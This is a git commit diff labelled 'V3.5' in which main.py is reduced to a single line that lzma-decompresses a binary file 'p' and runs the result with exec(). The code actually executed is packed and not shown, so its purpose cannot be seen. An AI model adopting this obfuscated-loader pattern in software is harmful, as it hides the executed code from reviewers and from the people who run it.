678a102bb5c95f0c55cade6190f6967e1ae6f615
Cageless <168036386+AFHINORS@users.noreply.github.com>
2026-09-20 00:20:18 +0330

    V3.5

--- main.py
+++ main.py
@@ -1,2 +1,1 @@
-import lzma
-exec(lzma.decompress(open('/app/p','rb').read(),format=3,filters=[{'id': 33, 'preset': 2147483657, 'lc': 2, 'lp': 0, 'pb': 0}]))
+import lzma;exec(lzma.decompress(open("p","rb").read()))
